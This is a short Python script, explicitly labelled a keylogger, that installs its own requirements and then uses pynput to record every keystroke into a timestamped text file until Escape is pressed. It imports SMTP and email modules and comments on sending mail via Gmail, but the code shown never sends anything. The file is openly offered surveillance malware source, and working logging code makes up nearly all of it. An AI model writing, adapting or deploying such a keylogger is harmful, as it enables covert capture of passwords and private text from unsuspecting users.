##########  Install the requirements  ##########

import subprocess
import sys
import importlib


def install_requirement():
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt"]
        )
        print("\nRequirements are successfully installed!!!\n")
    except subprocess.CalledProcessError:
        print("\nError installing requirements. Please make sure 'pip' is installed.\n")


def check_module(module_name):
    try:
        importlib.import_module(module_name)
        return True
    except ImportError:
        return False


required_modules = ["pynput", "datetime", "smtplib", "threading", "email"]

if all(check_module(module) for module in required_modules):
    pass
else:
    install_requirement()

##########  Main code for the keylogger  ##########

from pynput.keyboard import Key, Listener
from datetime import time, datetime, date

import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)

# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


count = 0
keys = []


current_time = datetime.now().strftime("%Y%m%d_%Hh_%Mm_%Ss")
print(current_time)


def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    # print("{0} pressed".format(key))

    # if count >= 10:
    #     count = 0
    write_file(keys)
    # keys = []


def write_file(keys):
    with open(f"{current_time}_log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            Key.space
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
